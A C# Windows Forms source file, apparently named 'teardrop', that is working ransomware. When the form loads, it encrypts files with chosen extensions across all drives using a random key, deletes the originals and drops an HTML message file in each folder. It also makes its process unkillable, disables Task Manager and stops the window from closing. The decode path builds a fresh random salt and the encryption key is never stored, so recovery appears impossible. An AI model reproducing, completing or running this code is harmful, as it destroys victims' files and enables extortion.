using System.Resources;
using System.Security.Cryptography;
using System.Text.Json;

namespace teardrop
{
    public partial class FrmMain : Form
    {
        private readonly int _keySyze;
        private readonly int _saltSyze;
        private readonly int _iteractionsLimit;
        private readonly char[] _allowedChars;
        private readonly string[] _ignoredPaths;
        private readonly string[] _allowedExtensions;
        private readonly string _defaultExtension;
        private readonly string _defaultMessage;
        private readonly int ZERO = 0;

        private readonly CancellationTokenSource _cancellationTokenSource;
        private readonly IProgress<string> _notification;
        private readonly SemaphoreSlim _semaphore;
        private CryptoManager? _cryptoManager;

        private enum CypherMode
        {
            Encode,
            Decode
        }

        public FrmMain()
        {
            InitializeComponent();
            
            _semaphore = new SemaphoreSlim(1, 10);

            _cancellationTokenSource = new CancellationTokenSource();

            _notification = new Progress<string>(WriteLine);

            ResourceManager resourceManager = new(typeof(FrmMain));

            _ignoredPaths = JsonSerializer.Deserialize<string[]>(resourceManager.GetString("IGNORED_PATHS") ?? "") ?? [];
            _allowedChars = JsonSerializer.Deserialize<char[]>(resourceManager.GetString("CHARS") ?? "")??[];
            _allowedExtensions = JsonSerializer.Deserialize<string[]>(resourceManager.GetString("ALLOWED_EXTENSIONS") ?? "") ?? [];
            _defaultMessage = JsonSerializer.Deserialize<string>(resourceManager.GetString("DEFAULT_MESSAGE") ?? "") ?? "";
            _defaultExtension = JsonSerializer.Deserialize<string>(resourceManager.GetString("DEFAULT_EXTENSION") ?? "") ?? "";
            _iteractionsLimit = JsonSerializer.Deserialize<int>(resourceManager.GetString("ITERACTIONS_LIMIT") ?? "0");
            _saltSyze = JsonSerializer.Deserialize<int>(resourceManager.GetString("SALT_SIZE") ?? "0");
            _keySyze = JsonSerializer.Deserialize<int>(resourceManager.GetString("KEY_SIZE") ?? "0");            

            GenereteApplicationID();
            
            CryptoSettings settings = new(GetHashedPassword(GetRandomString(_keySyze)), new byte[_saltSyze], _iteractionsLimit);

            _cryptoManager = new CryptoManager(settings, _cancellationTokenSource.Token);

#if !DEBUG
            ProcessManager.ProcessUnkillable();
            MachineManager.DisableTaskManager();
#endif
        }

        private static byte[] GetSaltBytes(int KeySize)
        {
            byte[] saltBytes = new byte[KeySize];
            RandomNumberGenerator.Create().GetBytes(saltBytes);
            return saltBytes;
        }

        private static byte[] GetHashedPassword(string Password)
        {
            return GetHashBytes(GetKeyBytes(Password));
        }

        private void GenereteApplicationID()
        {
            Text = GetRandomString(50);
        }

        private static byte[] GetHashBytes(byte[] passwordBytes)
        {
            return SHA256.HashData(passwordBytes);
        }

        private static byte[] GetKeyBytes(string password)
        {
            return System.Text.Encoding.Default.GetBytes(password);
        }

        public string GetRandomString(int length)
        {
            char[] randomChars = new char[length];

            Random random = new();

            for (int index = ZERO; index < length; index++)
            {
                randomChars[index] = _allowedChars[random.Next(_allowedChars.Length)];
            }

            return new string(randomChars);
        }

        public void WriteLine(string text)
        {
            txtBox.Text += $"[{DateTime.Now:yyyyy/MM/dd HH:mm:ss}]: {text}{Environment.NewLine}";
        }

        private async Task ChangeAllFilesAsync(string rootPath, CypherMode mode, IProgress<string> notification)
        {
            try
            {
                if ((File.GetAttributes(rootPath) & FileAttributes.ReparsePoint) is not FileAttributes.ReparsePoint)
                {
                    string newFilePath = string.Empty;

                    if (IgnoredPath(rootPath)) return;

                    foreach (string filePath in Directory.GetFiles(Path.GetFullPath(rootPath)))
                    {
                        string extension = Path.GetExtension(filePath);

                        switch (mode)
                        {
                            case CypherMode.Encode:

                                if (!IsValidExtension(extension)) break;

                                newFilePath = FileManager.AddExtension(filePath, _defaultExtension);

                                await _cryptoManager.EncodeFileAsync(filePath, newFilePath);

                                notification.Report($@"Encrypted {filePath}");

                                RemoveFile(filePath);

                                notification.Report($"Removed file {filePath}");

                                break;

                            case CypherMode.Decode:

                                if (!FileManager.HasExtension(filePath, _defaultExtension)) break;

                                newFilePath = FileManager.RemoveExtension(filePath, _defaultExtension);

                                await _cryptoManager.DecodeFileAsync(filePath, newFilePath);

                                notification.Report($"Decrypted {filePath}");

                                RemoveFile(filePath);

                                notification.Report($"Removed file {filePath}");

                                break;

                            default: throw new NotSupportedException();
                        }

                        foreach (string directory in GetDirectories(rootPath))
                        {
                            await ChangeAllFilesAsync(directory, mode, notification);
                        }
                    }

                    CreateMessageFile(rootPath);

                    notification.Report($"Message file created {rootPath}");
                }
            }
            catch (Exception ex)
            {
                notification.Report(ex.Message);
            }
        }

        private void CreateMessageFile(string path)
        {
            FileManager.WriteHtmlFile(path, _defaultMessage);
        }

        private bool IgnoredPath(string rootPath)
        {
            return _ignoredPaths.Contains(new DirectoryInfo(rootPath).Name);
        }

        private bool IsValidExtension(string extension)
        {
            return _allowedExtensions.Contains(extension.ToLower());
        }

        private static string[] GetDirectories(string path)
        {
            return Directory.GetDirectories(path);
        }

        private void RemoveFile(string filePath)
        {
            try
            {
                File.Delete(filePath);
            }
            catch (Exception ex)
            {
                WriteLine($"Cant delete file {ex.Message}");
            }
        }

        private async Task ManageDrivesAsync(CypherMode mode, IProgress<string> notification)
        {
            IList<Task> tasks = [];

            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                tasks.Add(ReturnTaskChangeDriveAsync(mode, notification, drive));
            }

            await Task.WhenAll(tasks);
        }

        private Task ReturnTaskChangeDriveAsync(CypherMode mode, IProgress<string> notification, DriveInfo drive)
        {
            return Task.Run(async () =>
            {
                await _semaphore.WaitAsync();

                try
                {
                    await ChangeDriveAsync(drive, mode, notification);
                }
                finally
                {
                    _semaphore.Release();
                }
            });
        }

        private async Task ChangeDriveAsync(DriveInfo drive, CypherMode mode, IProgress<string> notification)
        {
            notification.Report($@"Found drive {drive.Name}");

            try
            {
                if (!drive.IsReady) throw new AccessViolationException("Drive is not ready.");

                await ChangeAllFilesAsync(drive.Name, mode, notification);

                FileManager.WriteHtmlFile(drive.Name, _defaultMessage);

            }
            catch (Exception ex)
            {
                notification.Report($@"Found drive {drive.Name}, but it's not ready. adicional info: {ex.Message}");
            }
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private async void BtnDecode_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtKey.Text.Trim())) return;

            CryptoSettings settings = new(GetHashedPassword(txtKey.Text), GetSaltBytes(_saltSyze), _iteractionsLimit);

            _cryptoManager = new CryptoManager(settings, _cancellationTokenSource.Token);

#if DEBUG
            await ChangeAllFilesAsync("D:\\testDir", CypherMode.Decode, _notification);
#else
            await ManageDrivesAsync(CypherMode.Decode, _notification);
#endif
        }

        private async void FrmMain_Load(object sender, EventArgs e)
        {
#if DEBUG
            await ChangeAllFilesAsync("D:\\testDir", CypherMode.Encode, _notification);
#else
            await ManageDrivesAsync(CypherMode.Encode, _notification);
#endif
        }
    }
}